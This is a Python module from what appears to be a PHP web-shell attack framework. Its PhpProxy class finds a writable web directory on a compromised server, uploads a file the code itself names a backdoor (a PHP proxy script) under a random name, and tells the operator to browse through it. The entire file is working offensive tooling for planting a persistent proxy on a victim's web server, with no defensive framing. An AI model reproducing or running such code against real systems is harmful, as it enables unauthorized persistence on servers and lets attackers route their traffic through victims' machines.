'''
Created on 20/set/2011

@author: norby
'''


from core.module import Module, ModuleException
from core.vector import VectorList, Vector as V
from core.parameters import ParametersList, Parameter as P
from urlparse import urlparse
from random import choice
from string import letters
import re


classname = 'PhpProxy'
    
    
    
class PhpProxy(Module):

    params = ParametersList('Install PHP proxy to target', [],
                    P(arg='rpath', help='Upload proxy script to web accessible path (ends with \'.php\')'),
                    P(arg='finddir', help='Install proxy script automatically starting from web accessible dir', default='.'),
                    )
    

    def __get_backdoor(self):
        
        backdoor_path = 'modules/net/external/phpproxy.php'

        try:
            f = open(backdoor_path)
        except IOError:
            raise ModuleException(self.name,  "'%s' not found" % backdoor_path)
             
        return f.read()   
        
    def __upload_file_content(self, content, rpath):
        self.modhandler.load('file.upload').set_file_content(content)
        self.modhandler.set_verbosity(6)
        response = self.modhandler.load('file.upload').run({ 'lpath' : 'fake', 'rpath' : rpath, 'chunksize' : 256 })
        self.modhandler.set_verbosity()
        
        return response
        
    def __find_writable_dir(self, path = 'find'):
        
        self.modhandler.set_verbosity(6)
        
        self.modhandler.load('find.webdir').run({ 'rpath' : path })
        
        url = self.modhandler.load('find.webdir').found_url
        dir = self.modhandler.load('find.webdir').found_dir
        
        self.modhandler.set_verbosity()
        
        return dir, url
        
        
    def run_module(self, rpath, finddir):

        rname = ''.join(choice(letters) for i in xrange(4)) + '.php'

    
        if not rpath and finddir:
            path, url = self.__find_writable_dir(finddir)
            if not (path and url):
                raise ModuleException(self.name, 'Writable dir in \'%s\' not found. Specify writable dir using \':net.php_proxy rpath=writable_dir/proxy.php\'' % finddir)
            else:
                path = path + rname
                url = url + rname
        else:
            if not rpath.endswith('.php'):
                raise ModuleException(self.name, 'Remote PHP path must ends with \'.php\'')
            path = rpath
            url = None
        
    
        if path:

            phpfile = self.__get_backdoor()
            response = self.__upload_file_content(phpfile, path)
        
            if response:
                
                if url:
                    self.mprint('[%s] PHP proxy script uploaded. Go with your browser to %s?u=http://www.google.com\'' % (self.name, url))
                else:
                    self.mprint('[%s] PHP proxy script uploaded. Go with your browser to script URL followed by ?u=http://www.google.com\'' % (self.name))
                
                self.mprint('[%s] When finished remove \'%s\' and \'ses_*\' files created in the same folder' % (self.name, path))
                
                
                return 
            
        raise ModuleException(self.name,  "Error installing remote PHP proxy, check uploading path")
        
